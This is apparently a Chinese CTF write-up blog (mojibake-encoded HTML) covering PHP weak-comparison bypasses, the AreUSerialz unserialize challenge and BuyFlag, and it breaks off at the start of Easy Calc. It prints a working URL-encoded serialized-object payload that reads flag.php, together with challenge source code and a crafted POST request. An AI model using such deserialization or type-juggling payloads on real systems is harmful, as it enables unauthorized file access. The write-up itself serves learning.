class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;  <span class="hljs-comment">//æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦åªä»¥æ•°å­—æ„æˆï¼Œå°±æ˜¯åªèƒ½ä¸Šä¼ æ•°å­—</span><br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="å¼±æ¯”è¾ƒ-å¼ºæ¯”è¾ƒ"><a href="#å¼±æ¯”è¾ƒ-å¼ºæ¯”è¾ƒ" class="headerlink" title="å¼±æ¯”è¾ƒ å¼ºæ¯”è¾ƒ"></a>å¼±æ¯”è¾ƒ å¼ºæ¯”è¾ƒ</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ ä¼šå…ˆå°†ä¸¤ç§å‚æ•°ç±»å‹è½¬åŒ–æˆç›¸åŒ<br><br>å¦‚æœä¸ºæ•´å‹è·Ÿå­—ç¬¦å‹æ¯”è¾ƒ é‚£ä¹ˆå­—ç¬¦å°†ä»å·¦å¾€å³æå–æ•´å‹ç›´åˆ°é‡åˆ°å­—ç¬¦ç»“æŸ å†æ¯”è¾ƒã€‚<br><br>è‹¥å­—ç¬¦å‹ä¸ºæ•°å­—ä¸­é—´åŒ…å«äº†ä¸€ä¸ªeæˆ–E åˆ™eæˆ–Eä¼šè¢«ç§‘å­¦è®¡æ•°æ³•çš„æ ‡è®°<br><br>è€Œæ•°å­—ä¸­é—´åŒ…å«äº†ä¸€ä¸ª. ä¹Ÿä¼šè¢«çœ‹ä½œä¸ºå°æ•°ç‚¹<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51196842/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120591289</span><br><br></code></pre></td></tr></table></figure>
<p>ç„¶åä¸Šç½‘æŸ¥intvalå‡½æ•°ç»•è¿‡<br>intvalå‡½æ•°åœ¨å¤„ç†å­—ç¬¦ä¸²æ—¶ä»¥æ•°å­—å¼€å¤´é‡åˆ°ç¬¬ä¸€ä¸ªå­—æ¯æ—¶ä¼šåœæ­¢ã€‚</p>
<p>å¤§æ¦‚å°±æ˜¯å¼±æ¯”è¾ƒä¼šå°†ä¸åŒæ•°æ®ç±»å‹ï¼Œç„¶å$keyè¢«è½¬åŒ–ç±»å‹ä¼šå˜æˆ 123ï¼Œ<br>ç„¶ågetä¼  123 è¿›indexå³å¯</p>
<h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1><p>ç›´æ¥æ‹¿åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>ååºåˆ—åŒ–é¢˜ï¼Œæœ‰ç‚¹å¤æ‚,ç»™deepseekçœ‹:</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs llvm">è¦è·å–flagï¼Œéœ€è¦é€šè¿‡ååºåˆ—åŒ–æ¼æ´è§¦å‘FileHandlerç±»çš„readæ–¹æ³•è¯»å–flag.phpã€‚æ­¥éª¤å¦‚ä¸‹ï¼š<br><br>æ„é€ æ¶æ„å¯¹è±¡ï¼šåˆ›å»ºä¸€ä¸ªFileHandlerå¯¹è±¡ï¼Œè®¾ç½®opä¸ºæ•´æ•°<span class="hljs-number">2</span>ï¼ˆç»•è¿‡ææ„å‡½æ•°çš„ä¿®æ”¹ï¼‰ï¼Œfilenameä¸ºflag.phpã€‚<br><br>å¤„ç†åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼šç”±äº<span class="hljs-keyword">protected</span>å±æ€§åœ¨åºåˆ—åŒ–ä¸­åŒ…å«ç©ºå­—ç¬¦ï¼Œéœ€ä½¿ç”¨å¤§å†™Så’Œåå…­è¿›åˆ¶è½¬ä¹‰ç»•è¿‡å­—ç¬¦æ£€æŸ¥ã€‚<br><br>URLç¼–ç ï¼šç¡®ä¿ç‰¹æ®Šå­—ç¬¦æ­£ç¡®ä¼ è¾“ã€‚<br><br>***<br>opä¸ºæ•´æ•°<span class="hljs-number">2</span>ï¼šç»•è¿‡ææ„å‡½æ•°ä¸­çš„ä¸¥æ ¼æ¯”è¾ƒï¼Œè§¦å‘readæ–¹æ³•ã€‚<br><br>è½¬ä¹‰ç©ºå­—ç¬¦ï¼šä½¿ç”¨\<span class="hljs-number">00</span>è¡¨ç¤ºç©ºå­—ç¬¦ï¼Œé€šè¿‡is_validæ£€æŸ¥ã€‚<br><br>è¯»å–flag.phpï¼šåœ¨ææ„æ—¶è°ƒç”¨processï¼Œopä»ä¸º<span class="hljs-number">2</span>ï¼Œè¯»å–flag.phpå†…å®¹è¾“å‡ºã€‚<br><br>å®ƒç›´æ¥ç»™å‡ºäº†payload<span class="hljs-operator">=</span><br>?str<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>FileHandler<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>op<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>filename<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>flag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>content<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br><br>ç›´æ¥ä¼ å…¥åF<span class="hljs-number">12</span>å¾—åˆ°äº†flagï¼ï¼ï¼Ÿ<br></code></pre></td></tr></table></figure>
<p>è‡ªå·±æ¥è¯•è¯•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>(<span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>,<span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;\00*\00op&quot;</span>;N;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;N;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>
<p>è¿˜æ˜¯æ²¡ææ‡‚ï¼Œå»æ‰¾wpå§</p>
<p>å‡ºæ¥çš„ä¸€ç›´æ˜¯è¿™ç©æ„ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>
<p>ç®—äº†ç›´æ¥æ”¹å§<br>O:11:â€FileHandlerâ€:3:{s:2:â€opâ€;2;s:8:â€filenameâ€;â€™flag.phpâ€™;s:7:â€contentâ€;N;}<br>ä¸è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>;<br><span class="hljs-comment">// $a=new FileHandler($op=&quot;2&quot;,$filename=&quot;flag.php&quot;);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>è¡Œäº†</p>
<h2 id="æ€»ç»“ï¼š-1"><a href="#æ€»ç»“ï¼š-1" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>ç¬¬ä¸€æ­¥ï¼š____destruct:  ç»•è¿‡ &#x3D;&#x3D;&#x3D; â€œ2â€ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å¼ºç­‰å­—ç¬¦ä¸²2äºï¼Œç›´æ¥ä¼ å…¥æ•°å€¼2ä¼šè®©å®ƒä¸ç­‰äºï¼Œè€Œä¸ä¼šè¢«ç½®ä¸º1ï¼›<br>ç¬¬äºŒæ­¥ï¼šis_valid(),é¢˜ç›®é‡Œå®šä¹‰äº†è¿™ä¸ªå‡½æ•°æ¥åˆ¤æ–­è¾“å…¥çš„å­—ç¬¦æ˜¯å¦æœªasciiç é‡Œçš„å­—ç¬¦ï¼Œè‹¥æœ‰åœ¨asciiç é‡Œçš„å­—ç¬¦å°±ä¼šå¤±è´¥ï¼Œè¿™é‡Œç½‘ä¸Šå°±å‡ºç°äº†ä¸¤ç§ç»•è¿‡ï¼Œ<br>ç¬¬ä¸€ç§ï¼šå› ä¸ºé¢˜ç›®é‡Œç”¨çš„æ˜¯protectedç±»å‹çš„å˜é‡ï¼Œè¦ä»urlä¼ å…¥çš„è¯ä¼šå¤šå‡ºä¸asciié‡Œçš„å­—ç¬¦ï¼Œæ‰€ä»¥æƒ³åŠæ³•å°†payloadé‡Œçš„ä¸ä¸åˆè¦æ±‚å­—ç¬¦æ›¿æ¢ã€‚<br>ç¬¬äºŒç§ï¼šåˆ©ç”¨php 7.1+ç‰ˆæœ¬å¯¹ç±»çš„å±æ€§ä¸æ•æ„Ÿï¼Œç›´æ¥ä¼ å…¥publicç±»ï¼Œå°±ä¸ä¼šæœ‰ä¸å’Œè¦æ±‚å­—ç¬¦<br>å…·ä½“çœ‹ï¼š<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46246804/article/details/108746253">https://blog.csdn.net/m0_46246804/article/details/108746253</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73734159/article/details/134648981">https://blog.csdn.net/m0_73734159/article/details/134648981</a></p>
<p>ç¬¬äºŒæ­¥ï¼šåˆ°äº†è¿™é‡Œå› ä¸ºä¼ å…¥äº†2ï¼Œæ‰€ä»¥åˆ°äº†read()å‡½æ•°ï¼Œä¼šæœ‰file_get_contents()å‡½æ•°æ¥æŒ‡å®šæ–‡ä»¶æ¥ä¸‹ä¸€æ­¥ï¼Œç›´æ¥ä½¿å¾—filename&#x3D;â€flag.phpâ€å³å¯</p>
<p>æœ€åè®°å¾—F12æŸ¥çœ‹ï¼Œå› ä¸ºç¨‹åºé‡Œä¸ä¼šecho flag è€Œæ˜¯ return flagï¼ï¼ï¼ï¼ï¼<br>wpé‡Œæ˜¯ç”¨file_get_contents()çš„ä¼ªåè®®æ¥ç›´æ¥è¾“å‡ºbase64ç¼–ç åçš„flag</p>
<h2 id="notice-3"><a href="#notice-3" class="headerlink" title="notice"></a>notice</h2><p>is_valid()å‡½æ•°å¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œåˆ¤æ–­ï¼Œç¡®ä¿æ¯ä¸€ä¸ªå­—ç¬¦ASCIIç å€¼éƒ½åœ¨32-125ï¼Œå³è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯ç¡®ä¿å‚æ•°å­—ç¬¦ä¸²çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯å¯æ‰“å°çš„ï¼Œæ‰è¿”å›trueã€‚  </p>
<p>publicæ— æ ‡è®°ï¼Œå˜é‡åä¸å˜ã€‚ s:2:â€œopâ€;i:2;<br>protectedåœ¨å˜é‡åå‰æ·»åŠ æ ‡è®°\00*\00ã€‚ s:5:â€œ\00*\00opâ€;i:2;<br>privateåœ¨å˜é‡åå‰æ·»åŠ æ ‡è®°\00ç±»å\00ã€‚s:17:â€œ\00ç±»å\00opâ€;i:2;<br>åºåˆ—åŒ–åprotectedç±»å‹çš„å±æ€§å­˜åœ¨ä¸å¯æ‰“å°å­—ç¬¦ã€‚ï¼ˆprivateç±»å‹çš„å±æ€§åºåˆ—åŒ–åä¹Ÿäº§ç”Ÿä¸å¯æ‰“å°å­—ç¬¦ï¼‰;<br>PHPç‰ˆæœ¬7.1+ï¼Œå¯¹å±æ€§çš„ç±»å‹ä¸æ•æ„Ÿ;</p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h1><p>æ„Ÿè§‰æˆ‘å¿ƒè¿˜æ˜¯å¤ªæ€¥äº†ï¼Œæ²¡å‘ç°cookiï¼Œæ²¡è¯•ä¸€ä¸‹ç”¨bpæŠ“åŒ…ï¼Œå°±ä¸Šç½‘æ‰¾wpäº†ï¼Œæ˜æ˜æ˜¯å¾ˆæ ‡å‡†çš„æµç¨‹ï¼Œï¼Œï¼Œï¼Œï¼Œ<br>ä¸€å¼€å§‹å‘ç°è¦postä¸Šä¼ passwordï¼Œä½†æ˜¯æ²¡å‘å…ˆæœ‰cookieä¸€ç›´å›æ˜¾è¦æ±‚çš„è´¦æˆ·ï¼ŒæŠŠcookieæ”¹ä¸º1å³å¯ï¼Œ<br>ç„¶ååˆ°å¯†ç ï¼Œè¯•äº†â€œ404â€ï¼Œä¸è¡Œã€‚çœ‹wpï¼Œç”¨phpå¼±æ¯”è¾ƒï¼Œä¸Šä¼ 404aï¼Œæ˜¾ç¤ºèƒ½è¿‡ä¸æ˜¯çº¯æ•°å€¼è¿™å…³ï¼Œç„¶ååˆ°å¼±æ¯”è¾ƒï¼Œå¦‚æœæ¯”è¾ƒçš„å˜é‡å¼€å¤´æ˜¯æ•°å­—ï¼Œä¼šæŠŠæ•°å­—æˆªå–åˆ°é‡åˆ°å­—ç¬¦ä¸ºæ­¢ï¼Œæ‰€ä»¥404aä¼šå˜æˆ404ã€‚<br>ç„¶ååˆ°äº†moneyï¼Œè¯•äº†äº†ä¸€ä¸‹ï¼Œä¸èƒ½ä¼ å¤ªé•¿çš„æ•°å€¼ï¼Œæ‰€ä»¥ç”¨ç§‘å­¦è®¡æ•°æ³•ä¼ äº†9äº¿ï¼Œæ‹¿åˆ°flag </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST /<br><span class="hljs-attribute">cookie</span>=1<br><br><span class="hljs-attribute">password</span>=404aa&amp;money=9e8<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-31date-2025-04-27-20-24-35tags-web"><a href="#title-note-31date-2025-04-27-20-24-35tags-web" class="headerlink" title="title: note-31date: 2025-04-27 20:24:35tags: web"></a>title: note-31<br>date: 2025-04-27 20:24:35<br>tags: web</h2><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>è¿›å»åæ˜¯ä¸ªé¡µé¢ï¼Œè¾“å…¥è®¡ç®—å¼ï¼Œè®¡ç®—ç»“æœï¼Œæ²¡è§è¿‡ç±»ä¼¼çš„é¢˜ç›®å•Š,f12ï¼Œå‘ç°æœ‰ä¸ªcalu.php,è®¿é—®å¾—åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//å…³é—­é”™è¯¯æŠ¥å‘Š</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//å¦‚æœnumæœªè¢«è®¾ç½®åˆ™æ˜¾ç¤ºæºç 